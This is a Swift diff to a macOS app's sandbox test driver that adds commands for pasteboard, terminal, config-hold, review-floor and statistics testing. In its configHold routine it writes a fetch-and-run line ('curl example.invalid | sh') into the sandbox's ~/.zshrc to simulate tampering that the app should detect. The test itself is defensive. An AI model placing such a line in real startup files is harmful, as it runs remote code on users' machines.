@@ -50,6 +50,7 @@ enum Sandbox {
         isOn = true
         // Before anything reads a default (AppKit included).
         redirectDefaults(to: (statePath as NSString).appendingPathComponent("defaults"))
+        redirectPasteboard()
         keepWindowsWherePut()
         // Before anything makes the shared application: this is the one.
         let app = SandboxApplication.shared
@@ -126,6 +127,18 @@ enum Sandbox {
         guard UserDefaults.standard === SandboxDefaults.suite else { refuse("couldn't give the sandbox defaults of its own") }
     }
 
+    /// `NSPasteboard.general`, in place of the user's clipboard: a pasteboard of the sandbox's own, so a Copy or a Paste
+    /// in it (the `drag`, `copy` and `paste` commands, SwiftTerm's own Copy and Paste) never reads or sets yours.
+    private static func redirectPasteboard() {
+        SandboxPasteboard.own = NSPasteboard.withUniqueName()
+        guard let general = class_getClassMethod(NSPasteboard.self, #selector(getter: NSPasteboard.general)),
+              let own = class_getClassMethod(SandboxPasteboard.self, #selector(SandboxPasteboard.sandboxGeneral)) else {
+            refuse("couldn't give the sandbox a pasteboard of its own")
+        }
+        method_setImplementation(general, method_getImplementation(own))
+        guard NSPasteboard.general === SandboxPasteboard.own else { refuse("couldn't give the sandbox a pasteboard of its own") }
+    }
+
     // MARK: Windows
 
     /// AppKit pulls a titled window that's off every screen back until a corner of it shows (to -1240, -684 on a
@@ -180,6 +193,12 @@ enum Sandbox {
         let name = String(kept).trimmingCharacters(in: CharacterSet(charactersIn: ".-"))
         return name.isEmpty ? "shot" : name
     }
+}
+
+/// Holds the sandbox's pasteboard for the replaced `NSPasteboard.general`.
+private final class SandboxPasteboard: NSObject {
+    nonisolated(unsafe) static var own: NSPasteboard?
+    @objc class func sandboxGeneral() -> NSPasteboard { own! }
 }
 
 /// Holds the sandbox's defaults for the replaced `UserDefaults.standard`.
@@ -265,6 +284,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
     lazy var leads: LeadController = {
         // A lead `startlead` starts runs a fake Claude, never a real one (its arguments after the fake's own are ignored).
         let controller = LeadController(host: host, store: store) { [weak self] folder in self?.leadCommand(folder) ?? "exec /bin/cat" }
+        controller.teamActivity = TeamActivity()
         // A lead's questions to you would be alerts: none in the sandbox.
         controller.confirm = { [weak self] title, text, buttons in
             self?.refuse("a lead's question (\(title) \(text))")
@@ -273,6 +293,8 @@ private final class Driver: NSObject, NSApplicationDelegate {
         controller.answersTrust = false
         // Push requests from the sandbox's own vault book (its fake lead holds no grant in the host's): `push`.
         controller.pushes.vault = pushVault.vault(folder: state.appendingPathComponent("push/vault"), as: { .app })
+        // The agents' config held, from the same book: `confighold`.
+        controller.configHolds.vault = pushVault.vault(folder: state.appendingPathComponent("push/vault"), as: { .app })
         // The fake Claude needs nothing installed.
         controller.preflight = { _ in nil }
         return controller
@@ -359,6 +381,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         desk.atOnce = { [weak self] in self?.preferences.letAgentsOpenShells ?? false }
         desk.launch = { [weak self] request, then in
             guard let self else { return then(.failure(ShellAsk.Refusal("the sandbox is quitting"))) }
+            guard !shellLaunchFails else { return then(.failure(ShellAsk.Refusal("the sandbox's session host refused it: shell-fail on"))) }
             host.spawn(ShellAsk.spawnRequest(request, cols: 100, rows: 32)) { [weak self] result in
                 switch result {
                 case .success(let session):
@@ -370,6 +393,8 @@ private final class Driver: NSObject, NSApplicationDelegate {
         }
         return desk
     }()
+    /// `shell-fail on`: the sandbox's shell launches fail, as a refusing session host's would.
+    var shellLaunchFails = false
     /// The Wallet Manager peer the wallet desk sends to: the first made-up one, or none after `wallet-peer none`, or
     /// the Wallet Manager on this Mac after `wallet-peer this-mac`.
     var walletPeer = Driver.walletPeers[0].peerID
@@ -549,7 +574,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
     /// with a short conversation already in its transcript and the hook state a Claude session leaves. `agent` .codex:
     /// the same fake, told apart as Codex; nil: a shell's `cat`, with no agent at all.
     func startFake(label: String, slug named: String? = nil, transcript firstLines: String = Driver.firstTurn, agent: Agent? = .claude,
-                   title: String? = nil, _ done: @escaping (String?) -> Void) {
+                   title: String? = nil, zsh: Bool = false, _ done: @escaping (String?) -> Void) {
         let fakeClaude = agent == nil ? nil : self.fakeClaude
         fakeCount += 1
         let number = fakeCount
@@ -570,6 +595,9 @@ private final class Driver: NSObject, NSApplicationDelegate {
             // A terminal title as Claude Code sets one (OSC 0), when given: 2.1.311 titles its sessions "worker-<slug>".
             let titled = title.map { "printf '\\033]0;%s\\007' '\($0)'; " } ?? ""
             command = titled + "exec /usr/bin/python3 -I -u '\(fakeClaude)' '\(transcript)' '\(controlFile)' '\(agentState)'"
+        } else if zsh {
+            // As a Shell preset's session runs (`$SHELL -l -i`), on the sandbox's home: its own dotfiles, none of yours.
+            command = "echo \"{\\\"pid\\\": $$}\" > '\(agentState)'; exec /bin/zsh -l -i"
         } else {
             command = "printf 'A scratch terminal of the VibeSwitcher sandbox.\\n'; echo \"{\\\"pid\\\": $$}\" > '\(agentState)'; exec /bin/cat"
         }
@@ -749,6 +777,54 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 self.leads.refresh()
                 self.waitFor({ [weak self] in self?.leads.pushes.open[root]?.commit == head }) { [weak self] met in
                     self?.settle { done(met ? nil : "the card didn't read the request") }
+                }
+            }
+        }
+    }
+
+    /// The agents' config held for the fake lead (`ConfigSeal`): sealed, a worker of its team bound, then the sandbox's
+    /// own home's ~/.claude/settings.json and ~/.zshrc changed (never the user's), and the lead's look holds them; its
+    /// card, with Accept, is under the lead's chat. `accept` clicks it.
+    func configHold(_ how: String, _ done: @escaping (String?) -> Void) {
+        guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
+        let root = ((home as NSString).appendingPathComponent("projects/sandbox-lead") as NSString).standardizingPath
+        if how == "accept" {
+            guard leads.configHolds.held[root] != nil else { return done("nothing held: confighold first") }
+            leads.configHolds.accept(root)
+            return waitFor({ [weak self] in self?.leads.configHolds.held[root] == nil }) { [weak self] met in
+                self?.settle { done(met ? nil : "the click didn't seal it") }
+            }
+        }
+        let book = pushVault, folder = state.appendingPathComponent("push/vault"), home = self.home
+        book.configHome = home
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            let fail = { (text: String) in DispatchQueue.main.async { done(text) } }
+            do {
+                try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
+                try FileManager.default.createDirectory(atPath: home + "/.claude", withIntermediateDirectories: true)
+                try #"{"model":"opus"}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                let app = book.vault(folder: folder, as: { .app })
+                if (try? app.current(.lead, root: root, task: nil)) == nil {
+                    try app.bind(try app.startLead(root: root, branch: "main"), root: root, session: "sandbox-lead")
+                }
+                _ = try app.checkConfig(root: root)
+                let lead = book.vault(folder: folder, as: { .session("sandbox-lead") })
+                // `outside`: no team session ran since, so it's held as changed outside one (code that runs).
+                if how != "outside" {
+                    try lead.bind(try lead.issue(role: .worker, root: root, task: "sandbox-task"), root: root, session: "sandbox-worker")
+                }
+                try #"{"model":"opus","hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
+            } catch {
+                return fail("couldn't hold the config: \(error)")
+            }
+            DispatchQueue.main.async {
+                guard let self else { return }
+                self.leads.refresh()
+                self.waitFor({ [weak self] in self?.leads.configHolds.held[root] != nil }) { [weak self] met in
+                    self?.settle { done(met ? nil : "the card didn't read what's held") }
                 }
             }
         }
@@ -1072,6 +1148,10 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 preferences: preferences, setup: SetupModel(preferences: preferences, system: .fixed(hooks: [.claude: true, .codex: false], terminal: .notAsked, notifications: .off)),
                 phoneAccess: PhoneAccess(store: store), recentProjects: { [] }, showWelcome: { [weak self] in self?.refuse("the welcome window") },
                 host: host, briefing: briefing, dictation: dictation, policy: WorkingPolicyEditor(), boost: boostWatch,
+                // The sandbox's own projects with a workflow.md, against its own host's vault (the app's proof, as ever).
+                floor: ReviewFloorEditor(projects: { [home] in
+                    ((try? FileManager.default.contentsOfDirectory(atPath: home + "/projects")) ?? []).map { home + "/projects/" + $0 }
+                }),
                 // Its own fake passage's peers, whatever the path setting says: never the real passage.
                 walletPeers: WalletPeerList(load: { [passage = PassageCommand(executable: walletPassage.appendingPathComponent("passage").path)] _ in
                     WalletPeerList.Read(passage: passage, peers: WalletPeerChoice.list(passage: passage))
@@ -1091,12 +1171,18 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("status", "the sandbox's pid, host, fake sessions, windows and anything it refused"),
         ("chat [TEXT]", "selects the fake session whose title contains TEXT (the first one) and shows its chat"),
         ("terminal", "shows the selected session's terminal instead of its chat"),
+        ("drag [option|shift|command]…", "drags the mouse across the shown terminal's first two lines, through the window as a click does (with those keys held), to the view the window's hit test finds there: says which view the click hit, who has the keyboard, the program's mouse mode and what's selected"),
+        ("copy", "presses ⌘C as the menu does (to the first responder that takes Copy): says who took it and what the pasteboard holds (the sandbox's own, never yours)"),
+        ("paste TEXT", "puts TEXT on the sandbox's pasteboard and presses ⌘V as the menu does: says who took it and the terminal's last lines"),
+        ("keys TEXT", "types TEXT and Return into the shown terminal (a sandbox session's: e.g. a command for its zsh)"),
+        ("mouse on|off", "the shown session's program asks for mouse reporting (DECSET 1002 and 1006, as Claude Code's fullscreen does), or stops"),
         ("type TEXT", "types TEXT into the chat's composer (through its text view, as the keyboard does)"),
         ("send", "presses Return in the composer: the message goes to the fake session"),
         ("runblock [yes]", "the shown chat's last code block with a Run: shows what Run asks first, as the sheet; with yes, runs it as Run does once you confirm (tell it {\"op\": \"realShell\"} first to see its output)"),
         ("tell JSON", "hands a fake Claude (the selected one, or the one labelled \"to\") a FakeClaude op, e.g. '{\"op\": \"permission\", \"command\": \"swift build\"}' or '{\"op\": \"work\"}' (see Tests/VibeSwitcherTests/FakeClaude.swift)"),
         ("notify prepare|allow|deny", "a permission prompt's banner for the selected fake session (the sandbox posts no notifications): prepare reads its screen as posting the banner does (whether it gets Allow and Deny); allow or deny runs that banner's action (`PromptActions.handle`), a failure shown as the chat card's notice"),
-        ("new [codex|shell] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell"),
+        ("new [codex|shell|zsh] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell (cat), or an interactive zsh on the sandbox's home"),
+        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json and ~/.zshrc changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
         ("push [click|decline]", "the fake lead asks to push (push_remote): its folder a scratch repository and a scratch bare remote as origin (never GitHub), three commits ahead; its card, with Push and Decline, is under the lead's chat. click or decline settles it as those buttons do"),
         ("clear", "ends and removes every fake session: the sidebar is empty, with its New Session menu"),
         ("views", "the main window's AppKit views: how many, how deep, and the most common kinds (a chat that grows them stalls layout)"),
@@ -1113,6 +1199,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("team named", "starts the fake lead's worker and a verifier titled as Claude Code 2.1.311 names them (worker-<slug>, verify-<slug>) and moves the lead's agent into its .vibeswitcher/worktrees (start the lead first): its team still folds under it"),
         ("ask [TEXT]", "puts an open question for you (TEXT, or a made-up one) on the fake lead's board (start the lead first): its row reads needs you"),
         ("unfold", "shows the selected lead's team under its row in the sidebar"),
+        ("rotation", "shows the scheduled rotation chat line in the selected fake session"),
         ("replaced [N]", "shows the selected window session as a lead another session replaced, with N characters (default 200000) typed into it: the header's one line it makes"),
         ("answer", "answers the fake lead's open questions: its row reads as its terminal does again"),
         ("leadmail", "writes made-up messages between the fake lead and other projects' leads (start the lead first) to its private lead-mail record, one of them refused, and shows its Team tab: they're under Between leads"),
@@ -1122,7 +1209,8 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("soak [MINUTES [every SECONDS] [hour CYCLES] [worker-mb MB] [without LIST]]|stop", "a working day's actions on a timer, each cycle (every 20 s): a fake Claude started and its chat shown, a prompt sent and a long reply streamed, a dictation through its /voice, the lead's chat and its Team tab, its board's checkpoints, an accessibility client's walk of the window, the oldest fake past 3 ended and removed; the footprint (the process's own task_info) and the per-session state each minute, what grew by class at minute 2 and the end, in STATE/soak.log. a wallet request filed in the chat, sent and answered, the wallet desk's clock moved the cycle's share of a simulated hour (CYCLES cycles, default 30) with its 15 s refreshes; each simulated hour's least footprint and the live counters (wallet desk, timers, boards), and RESULT soak-simulated-hour-growth-mb at the end. every other cycle a worker shaped like a real one (a task on the lead's board, a transcript of MB MB of tool calls, default 4, its steer inbox, its chat and its terminal fed a build's output) ended by the role sweep, its footprint once removed, and RESULT soak-worker-growth-mb. LIST leaves out sessions, stream, dictation, team, ax, reports, wallet, workers. With no MINUTES: the log so far"),
         ("wallet-ask [address] [--workspace W] [--from W] [--chain N] [--to 0x…] [--amount WEI] [--expires-in 90m] [--data 0x…] [--reason TEXT]", "the selected fake session's agent files a made-up transaction request, as vs-wallet request does: its card shows in that chat, waiting for Send to Wallet Manager; with address, from an 0x address, so the card also offers Sign in browser wallet; the options replace the made-up request's values (scripts/e2e/wallet-e2e.sh); --data makes it a contract call (an approve's calldata, say)"),
         ("shell-ask [COMMAND]", "the selected fake session's agent asks for a new shell running COMMAND (a made-up program unless given) in its folder, as vs-shell run does: its card shows in that chat, waiting for Run"),
-        ("shell-click run|decline|dismiss", "presses that button on the newest shell request card in the selected chat (run starts the shell session in the sandbox's own host and selects it)"),
+        ("shell-click run|decline|dismiss", "presses that button on the newest shell request card in the selected chat (run starts the shell session in the sandbox's own host and selects it, and prints ran or the card's \"Not run: …\" line)"),
+        ("shell-fail on|off", "on: the sandbox's own host refuses to start the shells a card's Run asks for, so the Run says why it didn't go; off: they start again"),
         ("wallet-card", "prints the newest wallet request card in the selected chat: its id, state, line, not-picked-up hint, transaction (tx HASH [EXPLORER URL], once signed and submitted) and the Wallet Manager's checks"),
         ("wallet-later MINUTES", "moves the wallet desk's clock MINUTES ahead (never back) and redraws the cards, e.g. for the not-picked-up hint"),
         ("wallet-click send|retry|discard|browser|settings|dismiss", "presses that button on the newest wallet request card of the selected session, on its strip or not (dismiss takes a finished one off the strip; send goes to the sandbox's fake passage, never the real one; browser serves the local page but never opens a browser: wallet-page shows it; settings opens Settings › Wallet)"),
@@ -1133,16 +1221,56 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("select TEXT", "selects the first row whose title, project or task contains TEXT"),
         ("home", "shows the start page"),
         ("boost off|on|away|present|battery|battery-on|battery-low|veto|mark", "boost mark clicks the main window's Boost mark (Settings › General at Boost). Otherwise Boost mode in a made-up state (the power source, the charge, your presence and the usage made up): off; On on AC; Automatic away on AC (boosted), at the Mac, away on battery; On on battery with Also on battery at 86 % (boosted) or 24 %; or away on AC with the usage watch's veto. Settings and the menu-bar sheet show it"),
-        ("settings [TAB]", "opens Settings on a tab: " + SettingsTab.allCases.map(\.rawValue).joined(separator: ", ")),
+        ("settings [TAB] [SECTION]", "opens Settings on a tab: " + SettingsTab.allCases.map(\.rawValue).joined(separator: ", ")
+            + "; scrolled to a section: boost, review-floor (General; it makes the made-up project sandbox-floor first)"),
+        ("toolchain [dismiss]", "shows or dismisses a fake developer tools notice"),
         ("sheet NAME", "shows a sheet on the window: " + (Driver.sheets.map(\.name) + Driver.windowSheets.map(\.name) + ["choose-folder", "new-session-menu"]).joined(separator: ", ")),
         ("close settings|sheet", "closes Settings or the sheet"),
         ("shot NAME", "draws each window, light and dark, into the shots folder"),
+        ("pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT", "the pointer over the shown chat, as made-up events through its window: rows lists its messages' text views (where, their tooltip); hover moves the pointer onto the message holding TEXT; drag presses on the message holding FROM and lets go on the one holding TO; copy is ⌘C (to a pasteboard of the sandbox's own, never the general one), printing what it copied; menu right-clicks the message holding TEXT and prints its menu"),
         ("unproved", "connects again with a key the host doesn't hold: it refuses the app's proof and shows it no sessions"),
         ("quit", "quits (the host and fake sessions end with it)"),
     ]
 
+    /// A made-up project with a lead's workflow.md (its own sensitive_paths, merge_policy auto, audit_finders 1, a
+    /// verifier_model), for the review rules' floor; made once in the sandbox's home.
+    static func floorProject(home: String) -> String {
+        let root = ((home as NSString).appendingPathComponent("projects/sandbox-floor") as NSString).standardizingPath
+        let file = root + "/.vibeswitcher/workflow.md"
+        if !FileManager.default.fileExists(atPath: file) {
+            try? VibePaths.ensurePrivate(URL(fileURLWithPath: root + "/.vibeswitcher"))
+            let text = LeadWorkflow.updating(LeadWorkflow.template, with: [("merge_policy", "auto"), ("verifier_model", "fable"),
+                                                                           ("sensitive_paths", ".claude/, AGENTS.md, .github/, src/vault/")])
+            try? LeadWorkflow.write(Data(text.utf8), to: file)
+        }
+        return root
+    }
+
     /// The sheets `sheet NAME` shows: a sheet a change adds or touches goes here, so a worker can photograph it.
     static let sheets: [(name: String, make: (Driver) -> AnyView)] = [
+        // Settings › Project lead's review rules floor for the made-up project sandbox-floor, on a vault of its own
+        // (never the host's): the floor raised above the project's values in places.
+        ("review-floor", { driver in
+            let root = Driver.floorProject(home: driver.home)
+            let vault = LeadVault.Book().vault(folder: URL(fileURLWithPath: driver.home + "/review-floor-vault"), as: { .app })
+            _ = try? vault.setReviewFloor(LeadReviewFloor(sensitivePaths: [".claude/", "AGENTS.md", ".github/", "src/vault/", "src/signing/"],
+                                                          strictPaths: ["src/signing/**"], auditFinders: 2, mergePolicy: .askSensitive,
+                                                          riskLines: 300, riskModel: true, verifierDifferent: true,
+                                                          auditSamplePercent: 20), root: root)
+            let editor = ReviewFloorEditor(vault: vault, projects: { [root] }, inline: true)
+            editor.reload()
+            return AnyView(Form { ReviewFloorSection(editor: editor) }.formStyle(.grouped).frame(width: 620, height: 720))
+        }),
+        ("toolchain-note", { _ in
+            let before = ToolchainSnapshot(developerDir: "/Library/Developer/CommandLineTools", swift: "Apple Swift version 6.4.1",
+                                           sdkPath: "/Library/Developer/CommandLineTools/SDKs/MacOSX27.sdk", sdkVersion: "27",
+                                           commandLineTools: "27.0", xcodeExists: true)
+            var after = before
+            after.swift = "Apple Swift version 6.4.2"
+            after.sdkVersion = "27.2"
+            after.commandLineTools = "27.2"
+            return AnyView(ToolchainNoteView(note: LeadWitness.toolchainText(before: before, after: after)!))
+        }),
         ("new-project", { driver in
             AnyView(NewProjectSheet(model: NewProjectModel(location: driver.home + "/projects"),
                                     created: { [weak driver] folder, _ in driver?.refuse("starting a lead in \(folder)") },
@@ -1339,10 +1467,17 @@ private final class Driver: NSObject, NSApplicationDelegate {
         guard let card = model.selectedRow?.hostID.flatMap({ shellDesk.cards(for: $0).last }) else {
             return reply(false, "no shell request in this chat: shell-ask first")
         }
-        shellDesk.act(action, on: card.id) { [weak self] in
+        let said: (String) -> Void = { [weak self] outcome in
             guard let self else { return }
             let now = shellDesk.cards.first { $0.id == card.id }
-            settle { reply(true, "\(what): the card is now \(now.map { ShellCard.title($0.state) } ?? "gone")") }
+            settle { reply(true, "\(what)\(outcome): the card is now \(now.map { ShellCard.title($0.state) } ?? "gone")") }
+        }
+        guard action == .run else { return shellDesk.act(action, on: card.id) { said("") } }
+        shellDesk.run(card.id) { outcome in
+            switch outcome {
+            case .ran: said(" ran")
+            case .refused(let reason): said(" (\(reason))")
+            }
         }
     }
 
@@ -1658,7 +1793,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         let mac = SetupStats.MacWide.make(
             load: LoadProfile.make(minutes: 9_840, median: 9.4, p90: 22.8, max: 41.2, minutesAt24: 610, minutesAt36: 42, cores: 14),
             merges: MergeRate.make(recorded: 23, landed: 20, hours: 164),
-            freezes: Freezes.make(count: 2, hours: 164, partial: false, perDay: ["2026-10-29": 2], byLoad: nil, unsampled: 0),
+            freezes: statisticsFreezes(range: range),
             hoursBoosted: 38.5,
             boostNow: BoostState(on: true, why: "automatic: away, on AC", at: now),
             claude: [UsageNow.make(name: "seven_day", model: nil, usedPercent: 64, resetsAt: now + 3.4 * 86_400, reached: false,
@@ -1668,6 +1803,24 @@ private final class Driver: NSObject, NSApplicationDelegate {
             codex: [UsageNow.make(name: "weekly", model: nil, usedPercent: 31, resetsAt: nil, reached: false, pace: UsagePace(used: 31, elapsed: nil))])
         return SetupStats.make(range: range, at: Date(), projects: projects, total: payouts.adding(site), mac: mac,
                                quality: statisticsQuality(range: range))
+    }
+
+    /// The `statistics` sheet's freezes: made up, a falling daily trend over the range's days, today half gone.
+    static func statisticsFreezes(range: DateInterval) -> Freezes {
+        let calendar = Calendar.current
+        let counts = [96, 88, 120, 75, 41, 12, 5]
+        var days: [Freezes.Day] = []
+        var day = calendar.startOfDay(for: range.start)
+        while day < range.end, days.count < 31, let next = calendar.date(byAdding: .day, value: 1, to: day) {
+            let parts = calendar.dateComponents([.year, .month, .day], from: day)
+            let last = next >= range.end
+            let count = counts[days.count % counts.count]
+            days.append(Freezes.Day(day: String(format: "%04d-%02d-%02d", parts.year ?? 0, parts.month ?? 0, parts.day ?? 0),
+                                    freezes: last ? count / 2 : count, hours: last ? 12 : 24))
+            day = next
+        }
+        return Freezes.make(count: days.reduce(0) { $0 + $1.freezes }, hours: days.reduce(0) { $0 + $1.hours }, partial: false,
+                            perDay: [:], byLoad: nil, unsampled: 0, days: days)
     }
 
     /// The `statistics` sheet's quality figures: made up, every figure shown; the merge reruns' cost, Codex's cost per
@@ -1733,6 +1886,9 @@ private final class Driver: NSObject, NSApplicationDelegate {
              waited: 0.14, verifierHours: 10.9)
         all.codexLeftOut = 7
         all.lead = LeadSpend(tokens: 41_200_000, cost: 27.3, unpricedDays: 0)
+        // The audit sample's audits of review none, and the audits split by whether the verifier ran on the worker's model.
+        (all.sampledAudits, all.sampledImportant) = (4, 1)
+        (all.sameModelAudited, all.sameModelImportant, all.otherModelAudited, all.otherModelImportant) = (5, 3, 11, 10)
         let passes: [Double?] = [nil, 0.4, 0.5, 0.45, 0.6, 0.55, 0.62, 0.56]
         let costs: [Double?] = [nil, 14.2, 12.9, 13.6, 11.4, 12.2, 10.8, 12.4]
         let weeks = (0..<8).map { index -> QualityWeek in
@@ -1743,7 +1899,32 @@ private final class Driver: NSObject, NSApplicationDelegate {
         return SetupQuality(all: all, byAgent: [QualityGroup(name: "Claude", figures: claude), QualityGroup(name: "Codex", figures: codex)],
                             byModel: [QualityGroup(name: "fable", figures: fable), QualityGroup(name: "opus", figures: opus),
                                       QualityGroup(name: "sonnet", figures: sonnet)],
-                            weeks: weeks)
+                            weeks: weeks, scorecard: sandboxScorecard(range))
+    }
+
+    /// The scorecard's two weeks: this week with n ≥ 10 merges (a trend said), the week before with fewer (none said).
+    static func sandboxScorecard(_ range: DateInterval) -> SetupScorecard {
+        let end = range.end, day = 86_400.0
+        var week = ScorecardWeek(start: end.addingTimeInterval(-7 * day), end: end)
+        week.origins = LeadOrigins(counts: [.userReport: 3, .audit: 4, .incident: 1, .flake: 1, .lead: 5], unsaid: 2)
+        (week.merged, week.questions, week.userMinutes) = (12, 5, 64)
+        (week.costed, week.cost) = (11, 112.4)
+        (week.leadSpread, week.leadUnspread, week.leadKept) = (22.1, 5.2, true)
+        week.installTimes = [5.2, 7.9, 26, 3.1, 9.4, 30.5, 12, 6.6, 4.4, 18].map { $0 * 3600 }
+        week.notInstalled = 2
+        var previous = ScorecardWeek(start: end.addingTimeInterval(-14 * day), end: end.addingTimeInterval(-7 * day))
+        previous.origins = LeadOrigins(counts: [.userReport: 5, .audit: 2], unsaid: 1)
+        (previous.merged, previous.questions, previous.userMinutes) = (8, 6, 70)
+        (previous.costed, previous.cost) = (8, 96)
+        (previous.leadSpread, previous.leadKept) = (18, true)
+        previous.installTimes = [8, 20, 31, 6, 11, 9, 14, 22].map { $0 * 3600 }
+        let now = end.timeIntervalSince1970 - day / 2
+        let titles = ["Paste images into the chat", "Clean up ended sessions' folders", "Price Codex tokens", "Scorecard in Statistics"]
+        let installs = titles.enumerated().map { index, title in
+            ScorecardInstall(slug: "task-\(index)", title: title, createdAt: now - Double(index + 1) * day, mergedAt: now - Double(index + 1) * day + 4 * 3600,
+                             installedAt: index == 0 ? nil : now - Double(index + 1) * day + Double(5 + index) * 3600)
+        }
+        return SetupScorecard(week: week, previous: previous, installs: installs)
     }
 
     /// The `all-done` sheet's mark: a batch of four, three merged with receipts and one folded.
@@ -1915,6 +2096,18 @@ private final class Driver: NSObject, NSApplicationDelegate {
         case "terminal":
             model.showsChat = false
             reply(true, "terminal shown")
+        case "drag": dragInTerminal(Set(words.dropFirst()), reply)
+        case "copy": pressMenuKey("c", reply)
+        case "paste":
+            NSPasteboard.general.clearContents()
+            NSPasteboard.general.setString(rest, forType: .string)
+            pressMenuKey("v", reply)
+        case "mouse": mouseReporting(rest == "on", reply)
+        case "keys":
+            // Typed into the shown terminal, then Return, as the keyboard sends them (a sandbox session only: they all are).
+            guard let (terminal, _) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
+            terminal.send(txt: rest + "\r")
+            settle { reply(true, "typed \(rest.count) characters and Return\n\(self.terminalState(terminal))") }
         case "type":
             guard let composer = composer() else { return reply(false, "no composer: show a fake session's chat first (chat)") }
             composer.window?.makeFirstResponder(composer)
@@ -1940,8 +2133,14 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 }
             }
         case "new":
-            // "new codex LABEL" and "new shell LABEL": a Codex row, a plain shell's.
+            // "new codex LABEL", "new shell LABEL" and "new zsh LABEL": a Codex row, a plain shell's (`cat`), a real zsh's.
             let words = rest.split(separator: " ", maxSplits: 1).map(String.init)
+            if words.first == "zsh" {
+                let label = words.dropFirst().joined()
+                return startFake(label: label.isEmpty ? "Scratch zsh \(fakeCount + 1)" : label, agent: nil, zsh: true) { problem in
+                    reply(problem == nil, problem ?? "started")
+                }
+            }
             let kinded = words.first == "codex" || words.first == "shell"
             let agent: Agent? = words.first == "shell" ? nil : words.first == "codex" ? .codex : .claude
             let label = kinded ? words.dropFirst().joined() : rest
@@ -1969,6 +2168,18 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 transcript = text
             }
             startLead(transcript: transcript) { problem in if let problem { reply(false, problem) } else { show() } }
+        case "toolchain" where rest == "dismiss":
+            leads.dismissToolchainNote { [weak self] in self?.settle { reply(true, "developer tools notice dismissed") } }
+        case "toolchain":
+            let file = state.appendingPathComponent("toolchain-\(UUID().uuidString).json")
+            let before = ToolchainSnapshot(developerDir: "/Applications/Xcode.app/Contents/Developer", swift: "Apple Swift version 6.4.1",
+                                           sdkPath: "/SDKs/MacOSX27.sdk", sdkVersion: "27", commandLineTools: "27.0", xcodeExists: true)
+            ToolchainWatch(file: file, read: { before }).look()
+            var changed = before
+            changed.swift = "Apple Swift version 6.4.2"
+            let after = changed
+            leads.watchToolchain(ToolchainWatch(file: file, read: { after }))
+            leads.lookAtToolchain { [weak self] in self?.settle { reply(true, "developer tools notice shown") } }
         case "hangs":
             // The main thread's freezes so far, as the app's health digest tells them, and its longest wait for a beat.
             let folders = AppHealth.Folders(debug: watchdog.folder, reports: state.appendingPathComponent("no-crashes"))
@@ -1983,6 +2194,10 @@ private final class Driver: NSObject, NSApplicationDelegate {
             guard let row = model.selectedRow else { return reply(false, "nothing selected") }
             if !model.expandedTeams.contains(row.id) { model.toggleTeam(row.id) }
             settle { reply(true, "\(row.title)'s team shown") }
+        case "rotation":
+            guard let id = model.selectedRow?.hostID else { return reply(false, "no fake session selected") }
+            leads.rotationNotices[id] = "Started a fresh lead session (the last one's context was 72% full)"
+            settle { reply(true, "scheduled rotation chat line shown in the fake session") }
         case "replaced":
             guard let row = model.selectedRow, let id = row.hostID, let tty = row.session?.tty else { return reply(false, "no window session selected") }
             var replaced = ReplacedLead(root: row.cwd ?? home, project: "sandbox-lead", tty: tty, live: nil)
@@ -1991,6 +2206,9 @@ private final class Driver: NSObject, NSApplicationDelegate {
             settle { reply(true, "\(row.title) shown replaced, \(replaced.draft.count) characters typed into it") }
         case "push": pushRequest(rest) { problem in
             reply(problem == nil, problem ?? (rest.isEmpty ? "the lead asks to push main to origin (a scratch bare remote): its card is under the lead's chat" : "settled as \(rest)"))
+        }
+        case "confighold": configHold(rest) { problem in
+            reply(problem == nil, problem ?? (rest != "accept" ? "the agents' config held (~/.claude/settings.json, ~/.zshrc in the sandbox's home): its card is under the lead's chat" : "accepted"))
         }
         case "ask": ask(rest, answer: false) { problem in reply(problem == nil, problem ?? "the lead asks you") }
         case "answer": ask("", answer: true) { problem in reply(problem == nil, problem ?? "its questions answered") }
@@ -2007,11 +2225,15 @@ private final class Driver: NSObject, NSApplicationDelegate {
             model.showHome()
             reply(true, "start page shown")
         case "settings":
-            guard let tab = rest.isEmpty ? .general : SettingsTab(rawValue: rest) else {
+            let words = rest.split(separator: " ").map(String.init)
+            guard let tab = words.isEmpty ? .general : SettingsTab(rawValue: words[0]) else {
                 return reply(false, "no tab \(rest): " + SettingsTab.allCases.map(\.rawValue).joined(separator: ", "))
             }
-            showSettings(tab)
-            settle { reply(true, "settings shown on \(tab.rawValue)") }
+            let section = words.count > 1 ? SettingsSection(rawValue: words[1]) : nil
+            if words.count > 1, section == nil { return reply(false, "no section \(words[1]): boost, review-floor") }
+            if section == .reviewFloor { _ = Driver.floorProject(home: home) }
+            showSettings(tab, reveal: section)
+            settle { reply(true, "settings shown on \(tab.rawValue)" + (section.map { " at \($0.rawValue)" } ?? "")) }
